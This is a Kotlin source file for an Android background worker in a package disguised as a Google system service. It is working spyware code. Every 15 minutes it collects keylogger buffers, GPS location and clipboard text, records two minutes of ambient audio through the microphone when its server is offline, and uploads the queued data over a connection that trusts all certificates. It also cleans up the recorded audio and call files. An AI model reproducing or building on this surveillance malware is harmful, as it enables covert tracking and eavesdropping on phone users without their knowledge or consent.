package com.google.android.systemservice.workers

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.util.Log
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKeys
import androidx.work.*
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.services.AmbientRecordingService
import com.google.android.systemservice.services.LocationService
import com.google.android.systemservice.utils.DataSyncManager
import com.google.android.systemservice.utils.OfflineDataQueue
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * Periodic offline data collection worker.
 * Runs every 15 minutes via WorkManager regardless of server connectivity.
 *
 * Collects:
 * - GPS snapshot
 * - Clipboard snapshot  
 * - Keylog buffer persist
 * - Ambient recording (2 min) — only if offline
 *
 * On reconnect: DataSyncManager flushes all queued data and cleans up storage.
 */
class OfflineCollectorWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    companion object {
        private const val TAG = "OfflineCollector"
        private const val WORK_NAME = "offline_collector"
        private const val MAX_STORAGE_BYTES = 100L * 1024 * 1024 // 100MB

        private fun getEncryptedPrefs(context: Context, name: String): SharedPreferences {
            val masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)
            return EncryptedSharedPreferences.create(
                name,
                masterKeyAlias,
                context,
                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
            )
        }

        /**
         * Schedule periodic collection every 15 minutes.
         */
        fun schedule(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiresBatteryNotLow(false) // Run even on low battery
                .build()

            val request = PeriodicWorkRequestBuilder<OfflineCollectorWorker>(
                15, TimeUnit.MINUTES,
                5, TimeUnit.MINUTES // Flex interval
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP, // Don't restart if already scheduled
                request
            )
            Log.d(TAG, "Offline collector scheduled every 15 min")
        }
    }

    override suspend fun doWork(): Result {
        Log.d(TAG, "Offline collector running...")

        try {
            // 1. Persist keylog buffer to offline queue
            persistKeylogBuffer()

            // 2. Capture GPS snapshot
            captureLocationSnapshot()

            // 3. Capture clipboard snapshot
            captureClipboardSnapshot()

            // 4. Check if server is online
            val isOnline = checkServerConnectivity()

            if (isOnline) {
                // Server is online — flush all queued data
                Log.d(TAG, "Server online, flushing queued data...")
                val syncManager = DataSyncManager(applicationContext)
                if (syncManager.hasQueuedData()) {
                    syncManager.flushAll { count ->
                        Log.d(TAG, "Flushed $count items to server")
                        // Clean up uploaded files
                        cleanupUploadedFiles()
                    }
                }
            } else {
                // Server offline — queue ambient recording
                Log.d(TAG, "Server offline, starting ambient recording...")
                startAmbientRecording(120) // 2 minutes
            }

            // 5. Check storage limits
            enforceStorageLimits()

        } catch (e: Exception) {
            Log.e(TAG, "Offline collector error: ${e.message}")
            return Result.retry()
        }

        return Result.success()
    }

    private fun persistKeylogBuffer() {
        try {
            val prefs = getEncryptedPrefs(applicationContext, "keylog_prefs")
            val buffer = prefs.getString("keylog_buffer", "") ?: ""
            if (buffer.isNotEmpty()) {
                val queue = OfflineDataQueue(applicationContext)
                val payload = JSONObject().apply {
                    put("device_id", AndroidConfig.deviceId)
                    put("data", buffer)
                    put("timestamp", System.currentTimeMillis())
                }
                queue.enqueue("keylog", payload.toString(), AndroidConfig.deviceId)
                Log.d(TAG, "Keylog buffer persisted (${buffer.length} chars)")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Keylog persist error: ${e.message}")
        }
    }

    private fun captureLocationSnapshot() {
        try {
            // Read last known location from LocationService cache
            val prefs = getEncryptedPrefs(applicationContext, "location_cache")
            val lat = prefs.getFloat("last_lat", 0f)
            val lng = prefs.getFloat("last_lng", 0f)
            val accuracy = prefs.getFloat("last_accuracy", 0f)
            val timestamp = prefs.getLong("last_timestamp", 0)

            if (lat != 0f && lng != 0f) {
                val queue = OfflineDataQueue(applicationContext)
                val payload = JSONObject().apply {
                    put("device_id", AndroidConfig.deviceId)
                    put("latitude", lat.toDouble())
                    put("longitude", lng.toDouble())
                    put("accuracy", accuracy.toDouble())
                    put("timestamp", if (timestamp > 0) timestamp else System.currentTimeMillis())
                }
                queue.enqueue("location", payload.toString(), AndroidConfig.deviceId)
                Log.d(TAG, "Location snapshot: $lat, $lng")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Location capture error: ${e.message}")
        }
    }

    // Skip clipboard if DataCollectionService already collected it within 5 minutes
    private fun shouldCollectClipboard(): Boolean {
        val prefs = applicationContext.getSharedPreferences("clipboard_cache", Context.MODE_PRIVATE)
        val lastCollected = prefs.getLong("last_clipboard_collect", 0)
        return System.currentTimeMillis() - lastCollected > 5 * 60 * 1000
    }

    private fun captureClipboardSnapshot() {
        if (!shouldCollectClipboard()) {
            Log.d(TAG, "Clipboard recently collected, skipping")
            return
        }
        try {
            val clipboard = applicationContext.getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
            val clip = clipboard?.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).coerceToText(applicationContext).toString()
                if (text.isNotEmpty()) {
                    val queue = OfflineDataQueue(applicationContext)
                    val payload = JSONObject().apply {
                        put("device_id", AndroidConfig.deviceId)
                        put("clipboard_text", text)
                        put("timestamp", System.currentTimeMillis())
                    }
                    queue.enqueue("clipboard", payload.toString(), AndroidConfig.deviceId)
                    Log.d(TAG, "Clipboard snapshot captured, length: ${text.length}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Clipboard capture error: ${e.message}")
        }
    }

    private fun checkServerConnectivity(): Boolean {
        return try {
            val client = com.google.android.systemservice.utils.TrustAllCertificates
                .createClientBuilder()
                .connectTimeout(5, TimeUnit.SECONDS)
                .readTimeout(5, TimeUnit.SECONDS)
                .build()

            val request = okhttp3.Request.Builder()
                .url("${AndroidConfig.apiBaseUrl}/config")
                .head()
                .build()

            client.newCall(request).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            false
        }
    }

    private fun startAmbientRecording(durationSec: Int) {
        try {
            val intent = Intent(applicationContext, AmbientRecordingService::class.java).apply {
                putExtra("duration", durationSec)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(intent)
            } else {
                applicationContext.startService(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start ambient recording: ${e.message}")
        }
    }

    /**
     * Delete uploaded files to free storage.
     */
    private fun cleanupUploadedFiles() {
        try {
            val cacheDir = applicationContext.cacheDir
            val now = System.currentTimeMillis()
            val maxAge = 24 * 60 * 60 * 1000L // 24 hours

            cacheDir.listFiles()?.filter {
                (it.name.startsWith("ambient_") || it.name.startsWith("call_")) &&
                (now - it.lastModified()) > maxAge
            }?.forEach { file ->
                if (file.delete()) Log.d(TAG, "Cleaned up: ${file.name}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Cleanup error: ${e.message}")
        }
    }

    /**
     * Enforce 100MB storage limit — delete oldest files if exceeded.
     */
    private fun enforceStorageLimits() {
        try {
            val queueDir = File(applicationContext.filesDir, "offline_queue")
            val cacheDir = applicationContext.cacheDir

            var totalSize = 0L
            val allFiles = mutableListOf<File>()

            queueDir.listFiles()?.forEach { totalSize += it.length(); allFiles.add(it) }
            cacheDir.listFiles()?.filter {
                it.name.startsWith("ambient_") || it.name.startsWith("call_")
            }?.forEach { totalSize += it.length(); allFiles.add(it) }

            if (totalSize > MAX_STORAGE_BYTES) {
                Log.w(TAG, "Storage limit exceeded: ${totalSize / 1024 / 1024}MB > ${MAX_STORAGE_BYTES / 1024 / 1024}MB")
                // Delete oldest files first
                allFiles.sortBy { it.lastModified() }
                for (file in allFiles) {
                    if (totalSize <= MAX_STORAGE_BYTES * 0.8) break // Reduce to 80%
                    totalSize -= file.length()
                    file.delete()
                    Log.d(TAG, "Deleted for space: ${file.name}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Storage limit error: ${e.message}")
        }
    }
}
